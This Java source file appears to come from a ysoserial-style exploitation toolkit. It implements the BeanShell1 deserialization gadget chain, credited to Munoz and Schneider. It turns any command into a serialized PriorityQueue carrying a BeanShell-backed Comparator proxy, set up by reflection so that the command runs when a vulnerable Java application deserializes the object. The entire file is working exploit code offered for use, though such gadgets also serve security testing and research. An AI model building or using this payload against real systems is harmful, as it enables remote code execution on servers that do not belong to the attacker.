package A.R.ysogate.payloads.gadgets;

import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.utils.Reflections;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.BeanShellUtil;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(String command) throws Exception {
		String      payload = BeanShellUtil.makeBeanShellPayload(command);
		Interpreter i       = new Interpreter();
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
		i.eval(payload);
		XThis                      xt            = new XThis(i.getNameSpace(), i);
		InvocationHandler          handler       = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
		Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
		PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
		Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
		Reflections.setFieldValue(priorityQueue, "queue", queue);
		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
		return priorityQueue;
	}
}
